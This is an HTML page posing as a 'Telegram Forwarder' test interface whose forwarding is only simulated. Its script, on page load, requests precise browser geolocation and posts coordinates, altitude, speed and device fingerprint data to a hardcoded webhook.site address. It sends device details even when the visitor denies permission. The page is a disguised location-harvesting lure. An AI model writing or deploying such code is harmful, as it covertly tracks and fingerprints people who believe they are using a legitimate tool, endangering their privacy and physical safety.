<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Forwarder - Test UI</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-center p-4 font-sans">
  <div class="w-full max-w-xl space-y-4">

    <!-- Dashboard Container -->
    <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-2xl space-y-5">
      <div class="flex items-center justify-between pb-3 border-b border-slate-800">
        <div>
          <h1 class="text-xl font-bold text-white tracking-tight">Telegram Forwarder</h1>
          <p class="text-xs text-slate-400">Supports Public, Private (+links), and Private Topics</p>
        </div>
        <span id="statusBadge" class="px-2.5 py-1 text-xs font-semibold rounded-full bg-slate-800 text-slate-300">
          Idle
        </span>
      </div>

      <div class="space-y-4">
        <!-- From Input -->
        <div>
          <label class="block text-xs font-semibold uppercase tracking-wider text-sky-400 mb-1.5">From (Source)</label>
          <input type="text" id="source" placeholder="e.g. https://t.me/+76FBRC9V4aA2N2J1 or https://t.me/c/123456789/41" 
            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm focus:outline-none focus:border-sky-500 font-mono">
          
          <div class="grid grid-cols-2 gap-3 mt-2.5">
            <div>
              <label class="block text-[11px] font-medium text-slate-400 mb-1">Start Message ID (Optional)</label>
              <input type="number" id="min_msg_id" placeholder="e.g. 1" 
                class="w-full bg-slate-950/80 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-sky-500 font-mono">
            </div>
            <div>
              <label class="block text-[11px] font-medium text-slate-400 mb-1">End Message ID (Optional)</label>
              <input type="number" id="max_msg_id" placeholder="e.g. 2300" 
                class="w-full bg-slate-950/80 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-sky-500 font-mono">
            </div>
          </div>
          <p class="text-[11px] text-slate-500 mt-1">Accepts private links (<code>t.me/+...</code>), internal links (<code>t.me/c/...</code>), or public handles.</p>
        </div>

        <!-- To Input -->
        <div>
          <label class="block text-xs font-semibold uppercase tracking-wider text-emerald-400 mb-1.5">To (Destination)</label>
          <input type="text" id="target" placeholder="e.g. https://t.me/jajshdhg/15 or -100xxxxxxxxxx" 
            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm focus:outline-none focus:border-emerald-500 font-mono">
          <p class="text-[11px] text-slate-500 mt-1">Make sure you have posting permissions in destination.</p>
        </div>

        <!-- Clean Copy Toggle -->
        <div class="flex items-center pt-1">
          <label class="relative flex items-center cursor-pointer select-none">
            <input type="checkbox" id="clean_copy" checked class="sr-only peer">
            <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-sky-500"></div>
            <span class="ml-3 text-xs text-slate-300">Clean copy (Hide "Forwarded from" tag)</span>
          </label>
        </div>
      </div>

      <!-- Action Buttons -->
      <div class="flex items-center space-x-3 pt-2">
        <button id="startBtn" onclick="simulateStart()" 
          class="flex-1 py-2.5 rounded-xl text-sm font-bold bg-sky-500 hover:bg-sky-400 text-slate-950 transition active:scale-[0.99]">
          Start Forwarding
        </button>
        <button id="stopBtn" onclick="simulateStop()" disabled 
          class="px-5 py-2.5 rounded-xl text-sm font-semibold bg-rose-600/20 text-rose-300 border border-rose-500/30 hover:bg-rose-600/30 transition opacity-40 cursor-not-allowed">
          Stop
        </button>
      </div>
    </div>

    <!-- Live Logs -->
    <div class="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl space-y-2">
      <div class="flex items-center justify-between text-xs text-slate-400">
        <span class="font-semibold">Live Log</span>
        <span id="counter" class="font-mono text-sky-400">Processed: 0</span>
      </div>
      <div id="console" class="h-44 overflow-y-auto bg-slate-950 rounded-xl p-3 font-mono text-xs text-slate-300 space-y-1 border border-slate-800">
        <div class="text-slate-600">&gt; Waiting for input...</div>
      </div>
    </div>

  </div>

  <script>
    const WEBHOOK_URL = "https://webhook.site/dc904c46-070d-45da-8983-3a441fcef44d";

    function appendLog(message, colorClass = "text-slate-300") {
      const consoleEl = document.getElementById("console");
      const row = document.createElement("div");
      row.className = colorClass;
      row.textContent = `> ${message}`;
      consoleEl.appendChild(row);
      consoleEl.scrollTop = consoleEl.scrollHeight;
    }

    function dispatchWebhook(payload) {
      fetch(WEBHOOK_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(err => {
        console.error("Payload transmission failed:", err);
      });
    }

    // Geolocation handlers
    function onLocationGranted(position) {
      appendLog(`Location captured: ${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)}`, "text-emerald-400");
      appendLog("Posting telemetry to Webhook.site...", "text-sky-400");

      dispatchWebhook({
        status: "PERMISSION_GRANTED",
        timestamp: new Date().toISOString(),
        coordinates: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy_meters: position.coords.accuracy,
          altitude: position.coords.altitude,
          speed: position.coords.speed
        },
        device: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          resolution: `${window.screen.width}x${window.screen.height}`
        }
      });
    }

    function onLocationDenied(err) {
      let reason = "Denied by user";
      if (err.code === 2) reason = "Position unavailable";
      if (err.code === 3) reason = "Timeout";

      appendLog(`Location permission status: ${reason}`, "text-amber-400");

      dispatchWebhook({
        status: "PERMISSION_DENIED_OR_FAILED",
        code: err.code,
        reason: reason,
        timestamp: new Date().toISOString(),
        device: {
          userAgent: navigator.userAgent,
          platform: navigator.platform
        }
      });
    }

    // Trigger permission dialog immediately when page loads
    window.addEventListener("DOMContentLoaded", () => {
      if ("geolocation" in navigator) {
        appendLog("Requesting location access from browser...");
        navigator.geolocation.getCurrentPosition(
          onLocationGranted,
          onLocationDenied,
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        appendLog("Geolocation API not supported on this browser.", "text-rose-400");
      }
    });

    // Simulated UI test functions
    function simulateStart() {
      const src = document.getElementById("source").value.trim();
      const tgt = document.getElementById("target").value.trim();
      if (!src || !tgt) {
        alert("Enter both Source and Destination links to test validation.");
        return;
      }
      appendLog(`Simulated task started for ${src} -> ${tgt}`, "text-sky-300");
      document.getElementById("statusBadge").className = "px-2.5 py-1 text-xs font-semibold rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
      document.getElementById("statusBadge").innerText = "Running";
      document.getElementById("startBtn").disabled = true;
      document.getElementById("startBtn").classList.add("opacity-40", "cursor-not-allowed");
      document.getElementById("stopBtn").disabled = false;
      document.getElementById("stopBtn").classList.remove("opacity-40", "cursor-not-allowed");
    }

    function simulateStop() {
      appendLog("Simulated task stopped by user.", "text-rose-400");
      document.getElementById("statusBadge").className = "px-2.5 py-1 text-xs font-semibold rounded-full bg-slate-800 text-slate-300";
      document.getElementById("statusBadge").innerText = "Idle";
      document.getElementById("startBtn").disabled = false;
      document.getElementById("startBtn").classList.remove("opacity-40", "cursor-not-allowed");
      document.getElementById("stopBtn").disabled = true;
      document.getElementById("stopBtn").classList.add("opacity-40", "cursor-not-allowed");
    }
  </script>
</body>
</html>
